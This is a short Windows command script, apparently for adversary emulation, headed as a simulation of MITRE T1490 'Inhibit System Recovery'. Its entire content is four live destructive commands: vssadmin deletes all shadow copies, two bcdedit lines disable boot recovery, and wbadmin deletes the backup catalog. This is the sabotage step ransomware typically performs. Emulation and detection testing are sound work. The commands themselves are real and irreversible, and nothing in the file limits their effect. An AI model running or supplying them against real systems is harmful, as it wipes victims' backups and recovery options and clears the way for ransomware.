# Simulated T1490 Inhibit System Recovery Sabotage
# LOLBAS commands targeting Volume Shadow Copies and recovery catalog
vssadmin delete shadows /all /quiet
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
